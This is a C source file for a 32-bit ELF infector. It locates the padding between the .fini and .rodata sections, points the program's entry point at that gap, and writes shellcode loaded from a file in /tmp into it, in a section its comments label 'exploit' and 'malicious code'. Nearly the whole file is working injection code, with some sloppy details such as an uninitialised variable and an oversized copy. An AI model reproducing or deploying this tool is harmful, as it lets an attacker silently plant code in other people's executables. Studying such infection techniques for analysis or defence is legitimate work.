//Usage:./textpadding <file_name> (need nopie)

#include <elf.h> // for elf file struct
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>

#define MAX_FILE_PATH_LENGTH 100

unsigned int base_addr = 0x8048000;

void main(int argc,char** argv)
{
    char* filePath = argv[1];
    struct stat file_stat;
    int file_size;

    Elf32_Ehdr* Elf32Header;
    Elf32_Shdr* Elf32SectionHeaderBaseAddr;
    Elf32_Shdr* Elf32SectionNameTableHeader;

    // load file into memory
    stat(filePath,&file_stat);
    file_size = file_stat.st_size;
    printf("%d\n",file_size);
    int fd = open(filePath,O_RDWR);
    void* mem = mmap((void*)0x10000000,file_size,PROT_READ|PROT_WRITE,MAP_SHARED,fd,0);
    if(mem == MAP_FAILED)
    {
        printf("Mmap Failed:%s\n",strerror(errno));
        exit(-1);
    }

    //parse elf file header , get entry point , program header offset and section header offset
    Elf32Header = (Elf32_Ehdr*)mem;
    unsigned int entry = Elf32Header->e_entry;
    unsigned int phoffset = Elf32Header->e_phoff;
    unsigned int shoffset = Elf32Header->e_shoff;
    unsigned int shnum = Elf32Header->e_shnum;
    unsigned int shstrndx = Elf32Header->e_shstrndx;
    printf("Entry Point:%x\n",entry);
    printf("Program Header:%x\n",phoffset);
    printf("Section Header:%x\n",shoffset);
    printf("Section Header String Table Index:%x\n",shstrndx);

    //calc padding length
    //1. find .fini section header, get the end address of .fini
    //2. find .rodata sectino header , get the addr of .rodata
    //3. padding length = addr(.rodata) - end(.fini)
    unsigned int FiniEndAddr,RodataAddr = 0;
    unsigned int PaddingLength;
    Elf32SectionHeaderBaseAddr = (Elf32_Shdr*)(mem+shoffset);
    //calc .shstrtab offset address
    Elf32SectionNameTableHeader = (Elf32_Shdr*)(Elf32SectionHeaderBaseAddr+shstrndx);
    printf("Section Name Table Offset Address:%x\n",Elf32SectionNameTableHeader->sh_offset);
    unsigned int Elf32SectionNameTableOffset = Elf32SectionNameTableHeader->sh_offset;
    //calc
    char* Elf32SectionNameTableBaseAddr = (char*)(mem+Elf32SectionNameTableOffset);
    for(int i=0;i<shnum;i++)
    {
        char* SectionHeaderName = Elf32SectionNameTableBaseAddr + ((Elf32SectionHeaderBaseAddr + i)->sh_name);
    //  printf("%s\n",SectionHeaderName);
        if(!strcmp(SectionHeaderName,".fini"))
        {
            FiniEndAddr = (Elf32SectionHeaderBaseAddr + i)->sh_offset + ((Elf32SectionHeaderBaseAddr + i)->sh_size);
            printf(".fini end addr:%x\n",FiniEndAddr);
        }
        if(!strcmp(SectionHeaderName,".rodata"))
        {
            RodataAddr = (Elf32SectionHeaderBaseAddr + i)->sh_offset;
            printf(".rodata addr:%x\n",RodataAddr);
        }
        if(FiniEndAddr && RodataAddr)
        {
            printf("Padding Length:%x,Start at:%x\n",(RodataAddr - FiniEndAddr),FiniEndAddr);
            break;
        }
    }

    //exploit
    //1.write malicious code into file , end of jmp original entry
    //2.overwrite entry to start address
    unsigned int OriginalEntryAddr = Elf32Header->e_entry;
    Elf32Header->e_entry = base_addr + FiniEndAddr;
    //
    char* shellcodePath = "/tmp/shellcode_jmp.dump";
    struct stat shellcode_file_stat;
    int shellcode_file_size;
    stat(shellcodePath,&shellcode_file_stat);
    shellcode_file_size = shellcode_file_stat.st_size;
    printf("shellcode size:%d\n",shellcode_file_size);
    int shellcode_file_fd = open(shellcodePath,O_RDWR);
    //
    unsigned int shellcode_buf[(shellcode_file_size >> 2) + 1];
    read(shellcode_file_fd,shellcode_buf,shellcode_file_size);
    printf("%x\n",shellcode_buf[0]);
    memcpy(mem + FiniEndAddr, shellcode_buf, sizeof(shellcode_buf));
}